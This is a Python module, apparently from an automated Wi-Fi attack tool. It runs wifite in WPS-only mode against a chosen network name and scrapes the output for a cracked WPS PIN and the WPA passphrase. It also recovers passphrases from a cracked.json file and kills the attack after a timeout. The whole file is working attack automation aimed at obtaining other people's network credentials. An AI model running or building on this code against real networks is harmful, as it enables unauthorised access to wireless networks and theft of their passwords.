import subprocess
import re
import logging
import os
import json
import threading
from constants import BASE_DIR, CRACKED_FILE, ATTACK_TIMEOUT
from utils import strip_ansi, terminate_process_group

WIFITE_ARGS = [
    "wifite",
    "--wps-only",
    "--ignore-locks"
]


def extract_psk(line):
    if "WPA PSK:" in line or "PSK/Password:" in line:
        match = re.search(r'(?:WPA PSK|PSK/Password):\s*(.+)', line)
        if match:
            psk_candidate = match.group(1).strip().strip("'\"")
            if psk_candidate.lower() != "n/a":
                return psk_candidate
    return None


def extract_pin(line):
    if "WPS PIN:" in line or "Cracked WPS PIN:" in line:
        match = re.search(r'WPS PIN:\s*([0-9]{8})', line)
        if match:
            return match.group(1).strip()
    return None


class ProcessGroupCleanup:
    def __init__(self, proc):
        self.proc = proc
        self._lock = threading.Lock()
        self._started = False
        self._finished = threading.Event()

    def run(self, timeout=None):
        with self._lock:
            if self._started:
                wait_for_cleanup = True
            else:
                self._started = True
                wait_for_cleanup = False

        if wait_for_cleanup:
            self._finished.wait()
            return False

        try:
            if timeout is not None:
                logging.warning(
                    "Attack timeout (%ss) reached — killing process group.",
                    timeout,
                )
            terminate_process_group(self.proc)
        finally:
            self._finished.set()
        return True


def kill_proc_later(proc, timeout, cleanup):
    def _kill():
        if proc.poll() is None:
            cleanup.run(timeout=timeout)

    timer = threading.Timer(timeout, _kill)
    timer.daemon = True
    timer.start()
    return timer


def attack_target(interface, essid):
    logging.info(f"Starting attack on {essid}...")

    os.makedirs(BASE_DIR / "data", exist_ok=True)
    os.chdir(BASE_DIR / "data")

    proc = subprocess.Popen(
        WIFITE_ARGS + ["-i", interface, "-e", essid],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        start_new_session=True,
    )

    cleanup = ProcessGroupCleanup(proc)
    timeout_timer = kill_proc_later(proc, ATTACK_TIMEOUT, cleanup)

    psk = None
    pin = None

    try:
        for line in proc.stdout:
            line = strip_ansi(line.strip())
            if not line:
                continue
            logging.debug(f"[wifite] {line}")

            if not psk:
                psk = extract_psk(line)
                if psk:
                    logging.info(f"PSK found for {essid}: {psk}")
                    break

            if not pin:
                maybe_pin = extract_pin(line)
                if maybe_pin:
                    pin = maybe_pin
                    logging.info(f"WPS PIN found for {essid}: {pin}")
    finally:
        timeout_timer.cancel()
        cleanup.run()

    # Fallback: try to recover PSK from cracked.json
    if pin and not psk and CRACKED_FILE.exists():
        try:
            with open(CRACKED_FILE) as f:
                cracked_data = json.load(f)
            for entry in cracked_data:
                if entry.get("essid") == essid and entry.get("pin") == pin:
                    recovered_psk = entry.get("psk")
                    if recovered_psk:
                        psk = recovered_psk
                        logging.info(f"Recovered PSK from cracked.json for {essid}: {psk}")
        except Exception as e:
            logging.warning(f"Failed to parse cracked.json: {e}")

    if psk:
        return {"psk": psk, "pin": pin}
    elif pin:
        return {"pin": pin}
    else:
        logging.info(f"Attack on {essid} failed. No credentials obtained.")
        return None
